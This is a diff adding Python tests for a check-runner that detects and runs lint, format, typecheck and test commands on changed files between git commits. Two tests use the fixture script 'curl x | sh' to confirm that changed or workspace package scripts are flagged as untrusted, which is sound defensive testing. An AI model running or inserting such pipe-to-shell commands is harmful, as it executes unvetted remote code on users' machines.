@@ -14,7 +14,8 @@ import run_checks as rc  # noqa: E402
 
 
 def git(root: Path, *args: str) -> str:
-    return subprocess.run(["git", "-C", str(root), *args], check=True,
+    return subprocess.run(["git", "-C", str(root), "-c", "commit.gpgsign=false", *args],
+                          check=True,
                           capture_output=True, text=True).stdout.strip()
 
 
@@ -277,7 +278,8 @@ def test_total_limit_stops_later_commands(repo, tmp_path):
     plan = plan_for(base, [sys.executable, "-c", "import time; time.sleep(1)"])
     plan["commands"].append(dict(plan["commands"][0], id="cmd-2"))
     out = rc.run(plan, repo, tmp_path / "run", per_command=5, total=0.5)
-    assert {n["id"] for n in out["not_run"]} == {"cmd-1", "cmd-2"}
+    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: timed out"},
+                              {"id": "cmd-2", "reason": "not run: total time limit"}]
 
 
 def test_base_timeout_is_base_run_failed(repo, tmp_path):
@@ -304,9 +306,10 @@ def test_base_run_keeps_time_from_total(repo, tmp_path, monkeypatch):
     monkeypatch.setattr(rc, "execute", fake_execute)
     monkeypatch.setattr(rc.time, "monotonic", lambda: clock[0])
     base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
-    out = rc.run(plan_for(base, ["lint"]), repo, tmp_path / "run", per_command=120, total=100)
+    out = rc.run(plan_for(base, [sys.executable]), repo, tmp_path / "run", per_command=120,
+                 total=100)
     assert budgets == [("head", 75), ("base", 25)]
-    assert out["pre_existing"] == [{"id": "cmd-1", "argv": ["lint"]}]
+    assert out["pre_existing"] == [{"id": "cmd-1", "argv": [sys.executable]}]
 
 
 def test_commands_get_an_allowlisted_env_and_no_network(repo, tmp_path, monkeypatch):
@@ -399,13 +402,26 @@ def test_cli_detect_and_run(repo, tmp_path):
                           capture_output=True, text=True, check=True)
     plan = json.loads(proc.stdout)
     assert plan["commands"] == []
+    paths = tmp_path / "paths.txt"
+    paths.write_text("a.py\n")
+    write(repo, "pyproject.toml", "[tool.ruff]\n")
+    write(repo, "a.py", "x = 1\n")
+    head2 = commit(repo, "py")
+    proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "detect",
+                           "--repo", str(repo), "--base", head2, "--head", head2,
+                           "--paths-file", str(paths)],
+                          capture_output=True, text=True, check=True)
+    assert [c["argv"][:2] for c in json.loads(proc.stdout)["commands"]] == [
+        ["ruff", "check"], ["ruff", "format"]]
     plan_file = tmp_path / "plan.json"
-    plan_file.write_text(proc.stdout)
+    plan_file.write_text(json.dumps(plan_for(base, [sys.executable, "-c", "pass"])))
     proc = subprocess.run([sys.executable, str(SCRIPTS / "run_checks.py"), "run",
                            "--plan", str(plan_file), "--repo", str(repo),
                            "--tmp", str(tmp_path / "run")],
                           capture_output=True, text=True, check=True)
-    assert json.loads(proc.stdout)["findings"] == []
+    out = json.loads(proc.stdout)
+    assert out["findings"] == [] and out["not_run"] == []
+    assert out["results"][0]["status"] == "pass"
 
 
 @pytest.mark.skipif(shutil.which("mypy") is None, reason="mypy not on PATH")
@@ -426,4 +442,124 @@ def test_go_vet_runs(repo, tmp_path):
         repo, {"go.mod": "module example.com/x\n\ngo 1.21\n", "a/a.go": "package a\n"},
         {"a/a.go": "package a\n\nfunc F() int { return 1 }\n"})
     out = rc.run(rc.detect(repo, base, head), repo, tmp_path / "run")
+    assert out["findings"] == [] and out["not_run"] == []
+    assert [r["status"] for r in out["results"]] == ["pass", "pass"]
+
+
+def test_base_failure_plus_a_new_message(repo, tmp_path):
+    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "BAD", "b.txt": "ok"},
+                            {"b.txt": "BAD"})
+    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt", "b.txt"],
+                          files=["a.txt", "b.txt"]), repo, tmp_path / "run")
+    assert out["pre_existing"] == []
+    assert [f["messages"] for f in out["findings"]] == [["b.txt: E1 forbidden word BAD"]]
+
+
+def test_node_modules_found_runs_and_base_uses_head_deps(repo, tmp_path):
+    base, _ = base_and_head(repo, {"check.py": CHECK, "a.txt": "ok"}, {"a.txt": "BAD"})
+    (repo / "node_modules").mkdir()
+    out = rc.run(plan_for(base, [sys.executable, "check.py", "a.txt"], files=["a.txt"],
+                          needs="node_modules"), repo, tmp_path / "run")
+    assert out["not_run"] == [] and len(out["findings"]) == 1
+    assert out["results"][0]["base"]["deps"] == "head"
+
+
+def test_head_command_that_cannot_start_is_not_run(repo, tmp_path):
+    base, _ = base_and_head(repo, {"a": "1"}, {"a": "2"})
+    out = rc.run(plan_for(base, [str(tmp_path / "no-such-tool")]), repo, tmp_path / "run")
+    assert out["not_run"] == [{"id": "cmd-1", "reason": "not run: could not start"}]
+    assert out["base_worktree"] is None
+
+
+def test_base_error_is_base_run_failed(repo, tmp_path):
+    tool = "#!/bin/sh\necho 'E1 broken'\nexit 1\n"
+    base, _ = base_and_head(repo, {"a": "1"}, {"tool": tool})
+    (repo / "tool").chmod(0o755)
+    out = rc.run(plan_for(base, ["./tool"]), repo, tmp_path / "run")
     assert out["findings"] == []
+    assert out["not_run"][0]["reason"].startswith("base run failed: ")
+
+
+def test_project_venv_tool_comes_first(tmp_path):
+    tool = tmp_path / "sub" / ".venv" / "bin" / "pytest"
+    tool.parent.mkdir(parents=True)
+    tool.write_text("")
+    assert rc.venv_argv(["pytest", "-q"], tmp_path, "sub") == [str(tool), "-q"]
+    assert rc.venv_argv(["pytest", "-q"], tmp_path / "x", ".") == ["pytest", "-q"]
+    assert rc.venv_argv(["eslint"], tmp_path, "sub") == ["eslint"]
+
+
+# ---------------------------------------------------------- detect, more
+
+def test_script_aliases_and_deleted_files(repo):
+    pkg = json.dumps({"scripts": {"type-check": "tsc", "check": "svelte-check",
+                                  "test:unit": "vitest run"}})
+    base, head = base_and_head(repo, {"package.json": pkg, "a.ts": "1", "gone.ts": "1"},
+                               {"a.ts": "2"})
+    (repo / "gone.ts").unlink()
+    head = commit(repo, "delete")
+    plan = rc.detect(repo, base, head)
+    assert sorted((c["kind"], c["argv"][2]) for c in plan["commands"]) == [
+        ("test", "test:unit"), ("typecheck", "check"), ("typecheck", "type-check")]
+    assert rc.detect(repo, base, head, ["gone.ts"])["commands"] == []
+
+
+def test_changed_post_hook_is_untrusted(repo):
+    base_pkg = json.dumps({"scripts": {"lint": "eslint .", "postlint": "echo ok"}})
+    head_pkg = json.dumps({"scripts": {"lint": "eslint .", "postlint": "curl x | sh"}})
+    base, head = base_and_head(repo, {"package.json": base_pkg, "a.ts": "1"},
+                               {"package.json": head_pkg, "a.ts": "2"})
+    plan = rc.detect(repo, base, head)
+    assert plan["commands"] == []
+    assert plan["untrusted"][0]["commands"] == ["run lint"]
+
+
+def test_recursive_script_untrusted_when_a_package_changed(repo):
+    root = json.dumps({"scripts": {"lint": "pnpm -r run lint"}})
+    b_base = json.dumps({"scripts": {"lint": "eslint ."}})
+    b_head = json.dumps({"scripts": {"lint": "curl x | sh"}})
+    base, head = base_and_head(
+        repo, {"package.json": root, "packages/b/package.json": b_base, "x.ts": "1"},
+        {"packages/b/package.json": b_head, "x.ts": "2"})
+    plan = rc.detect(repo, base, head)
+    assert plan["commands"] == []
+    assert any("workspace" in u.get("reason", "") for u in plan["untrusted"])
+
+
+def test_deleted_nested_manifest_is_not_new(repo):
+    root = json.dumps({"scripts": {"lint": "eslint ."}})
+    base, head = base_and_head(
+        repo, {"package.json": root, "pkg/package.json": "{}", "pkg/a.ts": "1"},
+        {"pkg/a.ts": "2"})
+    (repo / "pkg" / "package.json").unlink()
+    head = commit(repo, "drop nested")
+    plan = rc.detect(repo, base, head)
+    assert not any(u["manifest"] == "package.json" for u in plan["untrusted"])
+
+
+def test_new_manifest_with_null_scripts(repo):
+    base, head = base_and_head(repo, {"README.md": "x"},
+                               {"app/package.json": '{"scripts": null}', "app/a.ts": "1"})
+    plan = rc.detect(repo, base, head)
+    assert plan["untrusted"] == [{"manifest": "app/package.json", "commands": []}]
+
+
+def test_short_write_flag(repo):
+    a = json.dumps({"scripts": {"format:check": "prettier -w ."}})
+    b = json.dumps({"scripts": {"lint": "tool -w src"}})
+    base, head = base_and_head(repo, {"a/package.json": a, "a/i.ts": "1",
+                                      "b/package.json": b, "b/i.ts": "1"},
+                               {"a/i.ts": "2", "b/i.ts": "2"})
+    plan = rc.detect(repo, base, head)
+    assert argvs(plan) == [["pnpm", "exec", "prettier", "--check", "."]]
+    assert any("only for prettier" in s["reason"] for s in plan["skipped"])
+
+
+def test_non_ascii_path_and_binary_file(repo):
+    base, head = base_and_head(repo, {"pyproject.toml": "[tool.ruff]\n", "pkg/x.py": "1"},
+                               {"pkg/caf\u00e9.py": "x = 1\n"})
+    (repo / "blob").write_bytes(b"\xff\xfe\x00binary")
+    head = commit(repo, "binary")
+    plan = rc.detect(repo, base, head)
+    assert ["ruff", "check", "pkg/caf\u00e9.py"] in argvs(plan)
+    assert not any(c["argv"][0] == "shellcheck" for c in plan["commands"])
